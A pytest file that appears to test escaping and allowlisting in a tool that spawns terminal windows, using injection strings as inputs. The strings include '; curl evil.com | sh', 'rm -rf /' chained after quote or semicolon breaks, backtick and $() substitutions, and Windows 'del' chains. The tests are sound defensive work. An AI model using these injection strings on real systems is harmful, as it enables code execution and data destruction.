"""Tests for terminal command injection prevention (Phase 2: Terminal Injection Cluster).

Covers:
- Task 5: AppleScript/shell escaping in terminal spawn functions (Finding #8)
- Task 6: working_directory validation in spawn_claude_session (Finding #5)
- Task 7: SPELLBOOK_CLI_COMMAND env var allowlist (Finding #13)
- Task 8: $TERMINAL env var allowlist for Linux (Finding #11)
"""

import os
import shlex
import subprocess
import sys
import tempfile
import types

import bigfoot
import pytest
from pathlib import Path

from spellbook.daemon.terminal import _escape_for_applescript


def _expected_macos_applescript(terminal_type: str, prompt: str, wd: str, cli: str) -> str:
    """Build the expected AppleScript for a given terminal type and inputs.

    This mirrors the production logic: shlex.quote all inputs, build the shell
    command, then AppleScript-escape the result for embedding in a double-quoted
    AppleScript string.
    """
    safe_prompt = shlex.quote(prompt)
    safe_wd = shlex.quote(wd)
    safe_cli = shlex.quote(cli)
    command = f"cd {safe_wd} && {safe_cli} {safe_prompt}"
    as_command = _escape_for_applescript(command)

    if terminal_type == "iterm2":
        return f'''
tell application "iTerm2"
    create window with default profile
    tell current session of current window
        write text "{as_command}"
    end tell
end tell
'''
    elif terminal_type == "warp":
        return f'''
tell application "Warp"
    activate
    tell application "System Events"
        keystroke "t" using {{command down}}
        delay 0.5
        keystroke "{as_command}"
        keystroke return
    end tell
end tell
'''
    else:  # terminal (Terminal.app)
        return f'''
tell application "Terminal"
    do script "{as_command}"
    activate
end tell
'''


def _expected_linux_command(terminal: str, prompt: str, wd: str, cli: str) -> list:
    """Build the expected command list for a given Linux terminal and inputs.

    Mirrors the production logic: shlex.quote all inputs, build the bash -c string.
    """
    safe_prompt = shlex.quote(prompt)
    safe_wd = shlex.quote(wd)
    safe_cli = shlex.quote(cli)
    command = f"cd {safe_wd} && {safe_cli} {safe_prompt}; exec bash"

    if terminal == "gnome-terminal":
        return ["gnome-terminal", "--", "bash", "-c", command]
    elif terminal == "konsole":
        return ["konsole", "-e", "bash", "-c", command]
    elif terminal == "xterm":
        return ["xterm", "-e", "bash", "-c", command]
    elif terminal == "terminator":
        return ["terminator", "-e", f"bash -c {shlex.quote(command)}"]
    elif terminal == "alacritty":
        return ["alacritty", "-e", "bash", "-c", command]
    else:
        return [terminal, "-e", "bash", "-c", command]


class TestAppleScriptEscaping:
    """AppleScript command construction must prevent injection via shlex.quote."""

    def test_subshell_in_prompt_is_escaped(self):
        """A prompt containing $(cmd) must be wrapped in shlex.quote single quotes."""
        from spellbook.daemon.terminal import spawn_macos_terminal

        prompt = "$(echo pwned)"
        expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")

        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
        mock_popen.returns(types.SimpleNamespace(pid=1234))

        with bigfoot:
            result = spawn_macos_terminal(
                terminal="terminal",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )

        assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
        mock_popen.assert_call(
            args=(["osascript", "-e", expected_applescript],),
            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
        )

    def test_semicolon_in_prompt_is_escaped(self):
        """A prompt containing semicolons must be shlex-quoted, preventing command chaining."""
        from spellbook.daemon.terminal import spawn_macos_terminal

        prompt = '"; rm -rf / #'
        expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")

        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
        mock_popen.returns(types.SimpleNamespace(pid=1234))

        with bigfoot:
            result = spawn_macos_terminal(
                terminal="terminal",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )

        assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
        mock_popen.assert_call(
            args=(["osascript", "-e", expected_applescript],),
            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
        )

    def test_backtick_in_prompt_is_escaped(self):
        """Backtick command substitution must be neutralized by shlex.quote."""
        from spellbook.daemon.terminal import spawn_macos_terminal

        prompt = "`rm -rf /`"
        expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")

        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
        mock_popen.returns(types.SimpleNamespace(pid=1234))

        with bigfoot:
            result = spawn_macos_terminal(
                terminal="terminal",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )

        assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
        mock_popen.assert_call(
            args=(["osascript", "-e", expected_applescript],),
            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
        )

    def test_working_directory_is_escaped(self):
        """working_directory with shell metacharacters must be shlex-quoted."""
        from spellbook.daemon.terminal import spawn_macos_terminal

        malicious_wd = '/tmp/$(whoami)'
        expected_applescript = _expected_macos_applescript("terminal", "hello", malicious_wd, "claude")

        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
        mock_popen.returns(types.SimpleNamespace(pid=1234))

        with bigfoot:
            result = spawn_macos_terminal(
                terminal="terminal",
                prompt="hello",
                working_directory=malicious_wd,
                cli_command="claude",
            )

        assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
        mock_popen.assert_call(
            args=(["osascript", "-e", expected_applescript],),
            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
        )

    def test_iterm2_uses_escaped_command(self):
        """iTerm2 AppleScript must use the escaped command in write text."""
        from spellbook.daemon.terminal import spawn_macos_terminal

        prompt = "$(whoami)"
        expected_applescript = _expected_macos_applescript("iterm2", prompt, "/tmp", "claude")

        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
        mock_popen.returns(types.SimpleNamespace(pid=5678))

        with bigfoot:
            result = spawn_macos_terminal(
                terminal="iTerm2",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )

        assert result == {"status": "spawned", "terminal": "iTerm2", "pid": 5678}
        mock_popen.assert_call(
            args=(["osascript", "-e", expected_applescript],),
            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
        )

    def test_warp_uses_escaped_command(self):
        """Warp AppleScript must use the escaped command in keystroke."""
        from spellbook.daemon.terminal import spawn_macos_terminal

        prompt = "; curl evil.com | sh"
        expected_applescript = _expected_macos_applescript("warp", prompt, "/tmp", "claude")

        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
        mock_popen.returns(types.SimpleNamespace(pid=9999))

        with bigfoot:
            result = spawn_macos_terminal(
                terminal="Warp",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )

        assert result == {"status": "spawned", "terminal": "Warp", "pid": 9999}
        mock_popen.assert_call(
            args=(["osascript", "-e", expected_applescript],),
            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
        )

    def test_popen_called_with_osascript(self):
        """subprocess.Popen must be called with ['osascript', '-e', script]."""
        from spellbook.daemon.terminal import spawn_macos_terminal

        expected_applescript = _expected_macos_applescript("terminal", "safe prompt", "/tmp", "claude")

        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
        mock_popen.returns(types.SimpleNamespace(pid=1234))

        with bigfoot:
            spawn_macos_terminal(
                terminal="terminal",
                prompt="safe prompt",
                working_directory="/tmp",
                cli_command="claude",
            )

        mock_popen.assert_call(
            args=(["osascript", "-e", expected_applescript],),
            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
        )


class TestLinuxTerminalEscaping:
    """Linux terminal command construction must use shlex.quote."""

    def test_prompt_is_shell_escaped_gnome(self):
        """User prompt must be escaped with shlex.quote for gnome-terminal bash -c."""
        from spellbook.daemon.terminal import spawn_linux_terminal

        prompt = "$(echo pwned)"
        expected_cmd = _expected_linux_command("gnome-terminal", prompt, "/tmp", "claude")

        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
        mock_popen.returns(types.SimpleNamespace(pid=1234))

        with bigfoot:
            result = spawn_linux_terminal(
                terminal="gnome-terminal",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )

        assert result == {"status": "spawned", "terminal": "gnome-terminal", "pid": 1234}
        mock_popen.assert_call(
            args=(expected_cmd,),
            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
        )

    def test_working_directory_is_shell_escaped_linux(self):
        """working_directory must be shlex.quote'd in bash -c command."""
        from spellbook.daemon.terminal import spawn_linux_terminal

        malicious_wd = "/tmp/$(id)"
        expected_cmd = _expected_linux_command("xterm", "hello", malicious_wd, "claude")

        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
        mock_popen.returns(types.SimpleNamespace(pid=1234))

        with bigfoot:
            result = spawn_linux_terminal(
                terminal="xterm",
                prompt="hello",
                working_directory=malicious_wd,
                cli_command="claude",
            )

        assert result == {"status": "spawned", "terminal": "xterm", "pid": 1234}
        mock_popen.assert_call(
            args=(expected_cmd,),
            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
        )

    def test_semicolon_in_prompt_escaped_linux(self):
        """Semicolons in prompt must be neutralized by shlex.quote."""
        from spellbook.daemon.terminal import spawn_linux_terminal

        prompt = "; rm -rf / ;"
        expected_cmd = _expected_linux_command("konsole", prompt, "/tmp", "claude")

        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
        mock_popen.returns(types.SimpleNamespace(pid=1234))

        with bigfoot:
            result = spawn_linux_terminal(
                terminal="konsole",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )

        assert result == {"status": "spawned", "terminal": "konsole", "pid": 1234}
        mock_popen.assert_call(
            args=(expected_cmd,),
            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
        )

    def test_terminator_double_escapes_command(self):
        """Terminator wraps the bash -c arg in shlex.quote for its -e flag."""
        from spellbook.daemon.terminal import spawn_linux_terminal

        prompt = "$(evil)"
        expected_cmd = _expected_linux_command("terminator", prompt, "/tmp", "claude")

        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
        mock_popen.returns(types.SimpleNamespace(pid=1234))

        with bigfoot:
            result = spawn_linux_terminal(
                terminal="terminator",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )

        assert result == {"status": "spawned", "terminal": "terminator", "pid": 1234}
        mock_popen.assert_call(
            args=(expected_cmd,),
            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE},
        )


class TestWindowsTerminalEscaping:
    """Windows terminal command construction must use subprocess.list2cmdline."""

    def test_prompt_with_special_chars_wt(self):
        """Prompt with special characters must be properly escaped for Windows Terminal."""
        from spellbook.daemon.terminal import spawn_windows_terminal

        prompt = 'test & del /f /q *'
        safe_cli_prompt = subprocess.list2cmdline(["claude", prompt])
        expected_cmd = ["wt", "-d", "C:\\Users\\test", "cmd", "/c", safe_cli_prompt]

        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
        mock_popen.returns(types.SimpleNamespace(pid=1234))

        with bigfoot:
            result = spawn_windows_terminal(
                terminal="windows-terminal",
                prompt=prompt,
                working_directory="C:\\Users\\test",
                cli_command="claude",
            )

        assert result == {"status": "spawned", "terminal": "windows-terminal", "pid": 1234}
        mock_popen.assert_call(
            args=(expected_cmd,),
            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE, "creationflags": getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)},
        )

    def test_prompt_with_special_chars_pwsh(self):
        """Prompt with special characters must be properly escaped for PowerShell."""
        from spellbook.daemon.terminal import spawn_windows_terminal

        prompt = 'test & del *'
        expected_cmd = ["pwsh", "-NoExit", "-Command",
                       "Set-Location 'C:\\Users\\test'; & 'claude' 'test & del *'"]

        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
        mock_popen.returns(types.SimpleNamespace(pid=1234))

        with bigfoot:
            result = spawn_windows_terminal(
                terminal="pwsh",
                prompt=prompt,
                working_directory="C:\\Users\\test",
                cli_command="claude",
            )

        assert result == {"status": "spawned", "terminal": "pwsh", "pid": 1234}
        mock_popen.assert_call(
            args=(expected_cmd,),
            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE, "creationflags": getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)},
        )

    def test_prompt_with_special_chars_cmd(self):
        """Prompt with special characters must be properly escaped for cmd."""
        from spellbook.daemon.terminal import spawn_windows_terminal

        prompt = 'test & del *'
        safe_cli_prompt = subprocess.list2cmdline(["claude", prompt])
        expected_cmd = ["cmd", "/c", "start", "cmd", "/k",
                       f'cd /d "C:\\Users\\test" && {safe_cli_prompt}']

        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
        mock_popen.returns(types.SimpleNamespace(pid=1234))

        with bigfoot:
            result = spawn_windows_terminal(
                terminal="cmd",
                prompt=prompt,
                working_directory="C:\\Users\\test",
                cli_command="claude",
            )

        assert result == {"status": "spawned", "terminal": "cmd", "pid": 1234}
        mock_popen.assert_call(
            args=(expected_cmd,),
            kwargs={"stdout": subprocess.PIPE, "stderr": subprocess.PIPE, "creationflags": getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)},
        )


class TestWorkingDirectoryValidation:
    """spawn_claude_session must validate working_directory (Finding #5)."""

    def test_rejects_nonexistent_directory(self):
        """working_directory pointing to a nonexistent path must be rejected."""
        from spellbook.server import _validate_working_directory

        with pytest.raises(ValueError, match="does not exist"):
            _validate_working_directory("/nonexistent/path/xyz", project_path=None)

    def test_rejects_system_directory(self):
        """System directories must be rejected (outside $HOME and project)."""
        from spellbook.server import _validate_working_directory

        system_dir = r"C:\Windows" if sys.platform == "win32" else "/etc"
        with pytest.raises(ValueError, match="outside allowed scope|does not exist"):
            _validate_working_directory(system_dir, project_path=None)

    def test_accepts_home_directory(self):
        """$HOME itself must be accepted."""
        from spellbook.server import _validate_working_directory

        home = str(Path.home())
        result = _validate_working_directory(home, project_path=None)
        assert result == str(Path(home).resolve())

    def test_accepts_home_subdirectory(self):
        """A real directory under $HOME must be accepted."""
        from spellbook.server import _validate_working_directory

        # Use a known subdirectory under home
        home = Path.home()
        # Create a temp dir under home for testing
        with tempfile.TemporaryDirectory(dir=str(home)) as tmpdir:
            result = _validate_working_directory(tmpdir, project_path=None)
            assert result == str(Path(tmpdir).resolve())

    def test_accepts_project_subdirectory(self):
        """A directory under the project path must be accepted."""
        from spellbook.server import _validate_working_directory

        with tempfile.TemporaryDirectory() as tmpdir:
            subdir = os.path.join(tmpdir, "src")
            os.makedirs(subdir)
            result = _validate_working_directory(subdir, project_path=tmpdir)
            assert result == str(Path(subdir).resolve())

    @pytest.mark.skipif(sys.platform == "win32", reason="symlinks require elevated privileges on Windows")
    def test_rejects_symlink_escape(self):
        """A symlink pointing outside allowed scope must be rejected after resolution."""
        from spellbook.server import _validate_working_directory

        with tempfile.TemporaryDirectory() as tmpdir:
            link = os.path.join(tmpdir, "escape")
            os.symlink("/etc", link)
            with pytest.raises(ValueError, match="outside allowed scope"):
                _validate_working_directory(link, project_path=tmpdir)

    def test_rejects_file_not_directory(self):
        """A path that exists but is a file (not a directory) must be rejected."""
        from spellbook.server import _validate_working_directory

        with tempfile.NamedTemporaryFile() as tmpfile:
            with pytest.raises(ValueError, match="does not exist"):
                _validate_working_directory(tmpfile.name, project_path=None)


class TestCLICommandAllowlist:
    """SPELLBOOK_CLI_COMMAND must be validated against an allowlist (Finding #13)."""

    def test_malicious_cli_command_falls_back_to_claude(self, monkeypatch):
        """A CLI command not in the allowlist falls back to 'claude'."""
        from spellbook.daemon.terminal import _get_cli_command

        monkeypatch.setenv("SPELLBOOK_CLI_COMMAND", "rm -rf /; claude")
        result = _get_cli_command()
        assert result == "claude"

    def test_valid_cli_commands_accepted(self, monkeypatch):
        """All known CLI commands are accepted."""
        from spellbook.daemon.terminal import _get_cli_command

        for cmd in ["claude", "codex", "gemini", "opencode"]:
            monkeypatch.setenv("SPELLBOOK_CLI_COMMAND", cmd)
            result = _get_cli_command()
            assert result == cmd

    def test_path_based_cli_command_extracts_basename(self, monkeypatch):
        """A full path to a known CLI is accepted by extracting basename."""
        from spellbook.daemon.terminal import _get_cli_command

        monkeypatch.setenv("SPELLBOOK_CLI_COMMAND", "/usr/local/bin/claude")
        result = _get_cli_command()
        assert result == "claude"

    def test_path_to_unknown_command_falls_back(self, monkeypatch):
        """A full path to an unknown command falls back to 'claude'."""
        from spellbook.daemon.terminal import _get_cli_command

        monkeypatch.setenv("SPELLBOOK_CLI_COMMAND", "/usr/local/bin/evil")
        result = _get_cli_command()
        assert result == "claude"

    def test_default_is_claude(self, monkeypatch):
        """Without env var, default is 'claude'."""
        from spellbook.daemon.terminal import _get_cli_command

        monkeypatch.delenv("SPELLBOOK_CLI_COMMAND", raising=False)
        result = _get_cli_command()
        assert result == "claude"

    def test_spawn_terminal_window_uses_validated_cli(self, monkeypatch):
        """spawn_terminal_window must use _get_cli_command when cli_command is None."""
        from spellbook.daemon.terminal import spawn_terminal_window

        monkeypatch.setenv("SPELLBOOK_CLI_COMMAND", "codex")
        monkeypatch.setattr("sys.platform", "darwin")

        mock_spawn = bigfoot.mock("spellbook.daemon.terminal:spawn_macos_terminal")
        mock_spawn.returns({"status": "spawned", "terminal": "t", "pid": 1})

        with bigfoot:
            spawn_terminal_window("terminal", "hello", "/tmp")

        mock_spawn.assert_call(args=("terminal", "hello", "/tmp", "codex"))


class TestTerminalEnvAllowlist:
    """$TERMINAL env var must be validated via shutil.which (Finding #11)."""

    def test_malicious_terminal_rejected(self, monkeypatch):
        """An unknown $TERMINAL value that doesn't exist on PATH must be ignored."""
        from spellbook.daemon.terminal import detect_linux_terminal

        monkeypatch.setenv("TERMINAL", "/tmp/evil")

        mock_which = bigfoot.mock("shutil:which")
        mock_which.returns(None)

        mock_run = bigfoot.mock("spellbook.daemon.terminal:subprocess.run")
        # 5 common terminals in cascade, all not found
        for _ in range(5):
            mock_run.returns(types.SimpleNamespace(returncode=1))

        with bigfoot:
            result = detect_linux_terminal()

        # Must NOT return the malicious value; should fall through to detection
        assert result == "xterm"  # final fallback
        mock_which.assert_call(args=("evil",))
        bigfoot.log.assert_log(
            "WARNING",
            "TERMINAL env var '/tmp/evil' not found via which(), falling back to detection",
            "spellbook.daemon.terminal",
        )
        for terminal in ["gnome-terminal", "konsole", "xterm", "terminator", "alacritty"]:
            mock_run.assert_call(
                args=(["which", terminal],),
                kwargs={"capture_output": True, "timeout": 5},
            )

    def test_known_terminal_in_env_accepted(self, monkeypatch):
        """A known terminal in $TERMINAL that exists via which() must be accepted."""
        from spellbook.daemon.terminal import detect_linux_terminal

        monkeypatch.setenv("TERMINAL", "alacritty")

        mock_which = bigfoot.mock("shutil:which")
        mock_which.returns("/usr/bin/alacritty")

        with bigfoot:
            result = detect_linux_terminal()

        assert result == "alacritty"
        mock_which.assert_call(args=("alacritty",))

    def test_full_path_to_known_terminal_accepted(self, monkeypatch):
        """$TERMINAL=/usr/bin/gnome-terminal extracts basename and validates."""
        from spellbook.daemon.terminal import detect_linux_terminal

        monkeypatch.setenv("TERMINAL", "/usr/bin/gnome-terminal")

        mock_which = bigfoot.mock("shutil:which")
        mock_which.returns("/usr/bin/gnome-terminal")

        with bigfoot:
            result = detect_linux_terminal()

        assert result == "gnome-terminal"
        mock_which.assert_call(args=("gnome-terminal",))

    def test_terminal_not_on_path_falls_through(self, monkeypatch):
        """Even a reasonable-looking $TERMINAL must be rejected if which() fails."""
        from spellbook.daemon.terminal import detect_linux_terminal

        monkeypatch.setenv("TERMINAL", "kitty")

        mock_which = bigfoot.mock("shutil:which")
        mock_which.returns(None)

        # gnome-terminal is first in cascade, found immediately
        mock_run = bigfoot.mock("spellbook.daemon.terminal:subprocess.run")
        mock_run.returns(types.SimpleNamespace(returncode=0))

        with bigfoot:
            result = detect_linux_terminal()

        assert result == "gnome-terminal"
        mock_which.assert_call(args=("kitty",))
        bigfoot.log.assert_log(
            "WARNING",
            "TERMINAL env var 'kitty' not found via which(), falling back to detection",
            "spellbook.daemon.terminal",
        )
        mock_run.assert_call(
            args=(["which", "gnome-terminal"],),
            kwargs={"capture_output": True, "timeout": 5},
        )

    def test_empty_terminal_env_uses_detection_cascade(self, monkeypatch):
        """An empty $TERMINAL value must be treated as unset and use detection cascade."""
        from spellbook.daemon.terminal import detect_linux_terminal

        monkeypatch.setenv("TERMINAL", "")

        # gnome-terminal not found, konsole found
        mock_run = bigfoot.mock("spellbook.daemon.terminal:subprocess.run")
        mock_run.returns(types.SimpleNamespace(returncode=1))
        mock_run.returns(types.SimpleNamespace(returncode=0))

        with bigfoot:
            result = detect_linux_terminal()

        assert result == "konsole"
        mock_run.assert_call(
            args=(["which", "gnome-terminal"],),
            kwargs={"capture_output": True, "timeout": 5},
        )
        mock_run.assert_call(
            args=(["which", "konsole"],),
            kwargs={"capture_output": True, "timeout": 5},
        )

    def test_no_terminal_env_uses_detection_cascade(self, monkeypatch):
        """Without $TERMINAL set, detection cascade runs normally."""
        from spellbook.daemon.terminal import detect_linux_terminal

        monkeypatch.delenv("TERMINAL", raising=False)

        # gnome-terminal not found, konsole found
        mock_run = bigfoot.mock("spellbook.daemon.terminal:subprocess.run")
        mock_run.returns(types.SimpleNamespace(returncode=1))
        mock_run.returns(types.SimpleNamespace(returncode=0))

        with bigfoot:
            result = detect_linux_terminal()

        assert result == "konsole"
        mock_run.assert_call(
            args=(["which", "gnome-terminal"],),
            kwargs={"capture_output": True, "timeout": 5},
        )
        mock_run.assert_call(
            args=(["which", "konsole"],),
            kwargs={"capture_output": True, "timeout": 5},
        )
